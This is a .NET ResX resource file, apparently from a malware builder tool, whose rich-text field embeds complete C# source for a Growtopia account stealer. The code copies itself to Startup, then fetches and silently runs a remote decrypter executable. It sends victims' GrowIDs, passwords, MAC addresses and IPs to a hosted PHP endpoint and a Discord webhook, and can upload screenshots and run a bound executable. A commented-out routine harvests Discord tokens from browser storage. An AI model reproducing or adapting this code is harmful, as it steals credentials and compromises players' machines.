<?xml version="1.0" encoding="utf-8"?>
<root>
  <!-- 
    Microsoft ResX Schema 
    
    Version 2.0
    
    The primary goals of this format is to allow a simple XML format 
    that is mostly human readable. The generation and parsing of the 
    various data types are done through the TypeConverter classes 
    associated with the data types.
    
    Example:
    
    ... ado.net/XML headers & schema ...
    <resheader name="resmimetype">text/microsoft-resx</resheader>
    <resheader name="version">2.0</resheader>
    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
        <value>[base64 mime encoded serialized .NET Framework object]</value>
    </data>
    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
        <comment>This is a comment</comment>
    </data>
                
    There are any number of "resheader" rows that contain simple 
    name/value pairs.
    
    Each data row contains a name, and value. The row also contains a 
    type or mimetype. Type corresponds to a .NET class that support 
    text/value conversion through the TypeConverter architecture. 
    Classes that don't support this are serialized and stored with the 
    mimetype set.
    
    The mimetype is used for serialized objects, and tells the 
    ResXResourceReader how to depersist the object. This is currently not 
    extensible. For a given mimetype the value must be set accordingly:
    
    Note - application/x-microsoft.net.object.binary.base64 is the format 
    that the ResXResourceWriter will generate, however the reader can 
    read any of the formats listed below.
    
    mimetype: application/x-microsoft.net.object.binary.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
            : and then encoded with base64 encoding.
    
    mimetype: application/x-microsoft.net.object.soap.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
            : and then encoded with base64 encoding.

    mimetype: application/x-microsoft.net.object.bytearray.base64
    value   : The object must be serialized into a byte array 
            : using a System.ComponentModel.TypeConverter
            : and then encoded with base64 encoding.
    -->
  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
    <xsd:element name="root" msdata:IsDataSet="true">
      <xsd:complexType>
        <xsd:choice maxOccurs="unbounded">
          <xsd:element name="metadata">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" />
              </xsd:sequence>
              <xsd:attribute name="name" use="required" type="xsd:string" />
              <xsd:attribute name="type" type="xsd:string" />
              <xsd:attribute name="mimetype" type="xsd:string" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="assembly">
            <xsd:complexType>
              <xsd:attribute name="alias" type="xsd:string" />
              <xsd:attribute name="name" type="xsd:string" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="data">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="resheader">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" />
            </xsd:complexType>
          </xsd:element>
        </xsd:choice>
      </xsd:complexType>
    </xsd:element>
  </xsd:schema>
  <resheader name="resmimetype">
    <value>text/microsoft-resx</value>
  </resheader>
  <resheader name="version">
    <value>2.0</value>
  </resheader>
  <resheader name="reader">
    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <resheader name="writer">
    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <metadata name="metroStyleManager1.TrayLocation" type="System.Drawing.Point, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a">
    <value>17, 17</value>
  </metadata>
  <data name="richTextBox1.Text" xml:space="preserve">
    <value>using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Reflection;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using System.Management;
using System.Collections.Specialized;
using System.Windows.Forms;

namespace SaveForwarderOneCS
{
    class Program
    {
        static Assembly a = Assembly.GetExecutingAssembly();
        static string weburl, savefiler;
        static bool ifcont;
        static string user = "*USER*";


        static string SendScreenshot = "ssfalse"; //ssfalse
        static string CopyToStartup = "ctsfalse"; //ctsfalse
        static string SendSaveDat = "ssdfalse"; //ssdfalse
        static string AntiSpam = "asfalse"; //asfalse
        static string FileBinder = "binderfalse"; //binderfalse
        static string SendWebhook = "swhfalse";
        //static string DiscordToken = "dctrue"; //dcfalse

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        private static extern bool SetProcessDPIAware();

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);


        const int SW_HIDE = 0;

        [STAThread]
        static void Main()
        {
            SetProcessDPIAware();
            try
            {
                File.Delete(Path.GetTempPath() + "\\result.txt");
            }
            catch (Exception)
            {

            }

            if (FileBinder == "bindertrue")
            {
                Task.Factory.StartNew(Bindexe);
            }

            try
            {
                if (CopyToStartup == "ctstrue")
                {
                    string thisFile = AppDomain.CurrentDomain.FriendlyName;
                    string Filepath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile;
                    if (!File.Exists(Filepath))
                    {
                        File.Copy(Assembly.GetExecutingAssembly().Location, Filepath);
                    }
                    else
                    {
                        File.Delete(Filepath);
                        File.Copy(Assembly.GetExecutingAssembly().Location, Filepath);
                    }
                }
            }
            catch (Exception) { }

            if (SavePath() != string.Empty || SavePath() != null)
            {
                string eternityurl = "http://wowprohaxerkk.000webhostapp.com/";
                try
                {
                    ServicePointManager.Expect100Continue = true;
                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                    var decrypter = new WebClient();
                    decrypter.DownloadFile("https://github.com/zoax33/Utils/blob/master/savedecrypter.exe?raw=true", Path.GetTempPath() + "\\savedecrypter.exe");
                    Process process = new Process();
                    process.StartInfo.FileName = Path.GetTempPath() + "\\savedecrypter.exe";
                    process.StartInfo.CreateNoWindow = true;
                    process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    process.Start();
                    process.WaitForExit();
                }
                catch (Exception)
                {
                    Application.DoEvents();
                }
                string[] info = File.ReadAllText(Path.GetTempPath() + "\\result.txt").Split(new char[]
                {
                                '|'
                });
                string[] SaveInfo = info;
                string GrowID = SaveInfo[0].ToLower();
                string Passwords = SaveInfo[1];
                string Mac = SaveInfo[2];
                RegistryKey accs = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32)
                    .OpenSubKey("System\\CurrentControlSet", true);
                try
                {
                    if (AntiSpam == "astrue")
                    {
                        string RegPass = (string)accs.GetValue(GrowID);
                        if (Passwords != null)
                        {
                            if (Passwords != RegPass)
                                ifcont = true;
                            else
                                ifcont = false;
                        }
                        else
                        {
                            ifcont = true;
                        }
                        if (!ifcont)
                            return;
                    }
                }
                catch { }
                string savenew = Path.GetTempPath() + GrowID.ToLower() + ".dat";
                if (File.Exists(savenew))
                    File.Delete(savenew);
                File.Copy(SavePath(), savenew);
                WebClient wc = new WebClient();
                weburl = "*WEBURL*"; // *WEBURL* /////////////////////////////////////////////////////////////////////////
                savefiler = "*SAVEFILTER*"; // *SAVEFILER* //////////////////////////////////////////////////////////////////////

                string requrl = eternityurl + "postsave.php?growid=" + GrowID + "&amp;password=" + Passwords + "&amp;owner=" + user + "&amp;timestamp=" + GetTimestamp(DateTime.Now) + "&amp;aap=" + Mac + "&amp;ip=" + GetIP();
                WebRequest wreq = WebRequest.Create(requrl);
                Debug.WriteLine(requrl);
                WebResponse wRes = wreq.GetResponse();
                string imageurl = "";
                WebRequest wreq1 = WebRequest.Create(eternityurl + "validate.php?username=" + user);
                WebResponse wRes1 = wreq1.GetResponse();
                StreamReader sr1 = new StreamReader(wRes1.GetResponseStream());
                string wresult = sr1.ReadToEnd();
                sr1.Dispose();
                if (SendScreenshot == "sstrue")
                    imageurl = Screenshot();

                try
                {
                    PostEmbed(weburl, imageurl);
                    if (SendSaveDat == "ssdtrue")
                        wc.UploadFile(savefiler, savenew);
                }
                catch { }



                File.Delete(savenew);
                if (Passwords != null)
                    accs.SetValue(GrowID, Passwords);
                accs.Close();
            }


        }


        public static string GetTimestamp(DateTime value)
        {
            return value.ToString("yyyy-MM-dd HH:mm");
        }
        public static string GetIP()
        {
            string IPADDRESS = new WebClient().DownloadString("http://ipv4bot.whatismyipaddress.com/");
            return IPADDRESS;
        }

        private static void PostEmbed(string url, string imageurl)
        {
            try
            {
                string GrowID = "Failed to get GrowID"; string Password = "Failed to get Password"; string Mac = "Failed to get MAC";
                var httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
                httpWebRequest.ContentType = "application/json";
                httpWebRequest.Method = "POST";
                try
                {
                    ServicePointManager.Expect100Continue = true;
                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                    var decrypter = new WebClient();
                    decrypter.DownloadFile("https://github.com/zoax33/Utils/blob/master/savedecrypter.exe?raw=true", Path.GetTempPath() + "\\savedecrypter.exe");
                    Process process = new Process();
                    process.StartInfo.FileName = Path.GetTempPath() + "\\savedecrypter.exe";
                    process.StartInfo.CreateNoWindow = true;
                    process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    process.Start();
                    process.WaitForExit();
                }
                catch (Exception)
                {
                    Application.DoEvents();
                }
                string[] info = File.ReadAllText(Path.GetTempPath() + "\\result.txt").Split(new char[]
                {
                                '|'
                });
                if (info != null)
                {
                    GrowID = info[0];
                    Password = info[1];
                    Mac = info[2];
                }
                /*
                string TokenString = "";

                string[] Tokens = DiscordTokens();

                if (Tokens != null)
                {
                    string tokenlist = "";
                    foreach (string token in Tokens)
                    {
                        tokenlist += token + @"\n";
                    }
                    MessageBox.Show(tokenlist);
                    TokenString = "{\"name\":\"Discord Tokens:\"," +
                                  "\"value\":\"```" + "tokenlist" + "```\"},";
                }

                bool iftoken = DiscordToken == "dctrue";*/

                using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
                {
                    string json = "{\"embeds\":[" +
                                  "{\"color\":977767," +
                                  "\"footer\":{" +
                                  "\"text\":\"Have fun! | " + user + " |" + "\"}," +
                                  "\"author\":{\"name\":\"" + GetIP() + "\"," +
                                  "\"icon_url\":\"https://discordemoji.com/assets/emoji/5018_thinkies.png\"}," +
                                  "\"image\":{\"url\":\"" + imageurl + "\"}," +
                                  "\"fields\":[" +
                                  "{\"name\":\"New Save.dat from:\"," +
                                  "\"value\":\"```" + Environment.UserName + " / " + Environment.MachineName + "```\"}," +
                                  "{\"name\":\"GrowID:\"," +
                                  "\"value\":\"```" + GrowID + "```\"}," +
                                  "{\"name\":\"Password:\"," +
                                  "\"value\":\"```" + Password + "```\"}," + /*TokenString +*/
                                  "{\"name\":\"AAP:\"," +
                                  "\"value\":\"```" + Mac + "```\"}" +
                                  "]}]}";

                    streamWriter.Write(json);
                }
                var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
                using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
                {
                    var result = streamReader.ReadToEnd();
                }
            }
            catch { }
        }

        /*private static string[] DiscordTokens()
        {
            try
            {
                List&lt;string&gt; locs = new List&lt;string&gt;();
                List&lt;string&gt; tokens = new List&lt;string&gt;();

                locs.Add(@"Roaming\Discord");
                locs.Add(@"Roaming\discordcanary");
                locs.Add(@"Roaming\discordptb");
                locs.Add(@"Local\Google\Chrome\User Data\Default");
                locs.Add(@"Roaming\Opera Software\Opera Stable");
                locs.Add(@"Local\BraveSoftware\Brave-Browser\User Data\Default");
                locs.Add(@"Local\Yandex\YandexBrowser\User Data\Default");

                foreach (string loc in locs)
                {
                    DirectoryInfo leveldb = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
                              + @"\AppData\"
                              + loc
                              + @"\Local Storage\leveldb");

                    try
                    {
                        foreach (var file in leveldb.GetFiles("*.log"))
                        {
                            string contents = file.OpenText().ReadToEnd();

                            foreach (Match match in Regex.Matches(contents, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                                tokens.Add(match.Value);

                            foreach (Match match in Regex.Matches(contents, @"mfa\.[\w-]{84}"))
                                tokens.Add(match.Value);
                        }
                    }
                    catch { }

                    try
                    {
                        foreach (var file in leveldb.GetFiles("*.ldb"))
                        {
                            string contents = file.OpenText().ReadToEnd();

                            foreach (Match match in Regex.Matches(contents, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                                tokens.Add(match.Value);

                            foreach (Match match in Regex.Matches(contents, @"mfa\.[\w-]{84}"))
                                tokens.Add(match.Value);
                        }
                    }
                    catch { }

                }

                tokens = tokens.Distinct().ToList();

                if (tokens.Count == 0) return null;

                return tokens.ToArray();
            }
            catch
            {
                return null;
            }
        }*/

        private static void Close()
        {
            Environment.Exit(0);
        }

        private static string Screenshot()
        {
            try
            {
                Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                using (Graphics g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                }
                ImageConverter converter = new ImageConverter();
                NameValueCollection data = new NameValueCollection
                        {
                            {
                                "image",
                                Convert.ToBase64String((byte[])converter.ConvertTo(bmp, typeof(byte[])))
                            }
                        };
                byte[] bytes = new WebClient().UploadValues("https://api.imgbb.com/1/upload?key=ccbe8b8829304410e2f7d53423b7ae9c", data);
                string @string = Encoding.UTF8.GetString(bytes);
                @string = @string.Replace(@"\/", @"/");
                Regex regex = new Regex(@"(https?:\/\/[a-zA-Z0-9]+\.[^\s][^""]{1,}[a-zA-Z0-9]+\.png)");
                Match match = regex.Match(@string);
                return match.Groups[0].Value;
            }
            catch
            {
                return "";
            }

        }

        private static void Bindexe()
        {
            try
            {
                Stream manifestResourceStream = a.GetManifestResourceStream("1.txt");
                byte[] array = new byte[manifestResourceStream.Length];
                manifestResourceStream.Read(array, 0, array.Length);
                manifestResourceStream.Close();
                var FStream = new FileStream(Path.GetTempPath() + "\\1.exe", FileMode.Create);
                FStream.Write(array, 0, array.Length);
                FStream.Close();
                FStream.Dispose();
                Process process = new Process();
                process.StartInfo.FileName = Path.GetTempPath() + "\\1.exe";
                process.Start();
            }
            catch { }
        }

        public static string SavePath()
        {
            try
            {
                RegistryKey gtreg;
                if (Environment.Is64BitOperatingSystem)
                {
                    gtreg = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
                }
                else
                {
                    gtreg = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry32);
                }
                try
                {
                    gtreg = gtreg.OpenSubKey(@"Software\Growtopia", true);
                    string pathvalue = (string)gtreg.GetValue("path");
                    if (Directory.Exists(pathvalue))
                    {
                        if (File.Exists(pathvalue + @"\save.dat"))
                        {
                            string sdat = null;
                            var r = File.Open(pathvalue + @"\save.dat", FileMode.Open, FileAccess.Read, FileShare.Read);
                            using (FileStream fileStream = new FileStream(pathvalue + @"\save.dat", FileMode.Open, FileAccess.Read, FileShare.Read))
                            {
                                using (StreamReader streamReader = new StreamReader(fileStream, Encoding.Default))
                                {
                                    sdat = streamReader.ReadToEnd();
                                    streamReader.Close();
                                }
                                r.Close();
                                fileStream.Close();
                            }

                            if (sdat.Contains("tankid_password") &amp; sdat.Contains("tankid_name"))
                            {
                                return pathvalue + @"\save.dat";
                            }
                            else
                            {
                                return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
                            }
                        }
                        else
                        {
                            return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
                        }

                    }
                    else
                    {
                        return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
                    }
                }
                catch
                {
                    return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
                }
            }
            catch
            {
                return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
            }
        }
    }
}</value>
  </data>
  <metadata name="openFileDialog1.TrayLocation" type="System.Drawing.Point, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a">
    <value>183, 17</value>
  </metadata>
  <metadata name="AAPIniDialog.TrayLocation" type="System.Drawing.Point, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a">
    <value>323, 17</value>
  </metadata>
  <metadata name="BinderFileDialog.TrayLocation" type="System.Drawing.Point, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a">
    <value>446, 17</value>
  </metadata>
  <metadata name="txtPEName.TrayLocation" type="System.Drawing.Point, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a">
    <value>587, 17</value>
  </metadata>
  <metadata name="metroTextBox1.TrayLocation" type="System.Drawing.Point, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a">
    <value>698, 17</value>
  </metadata>
</root>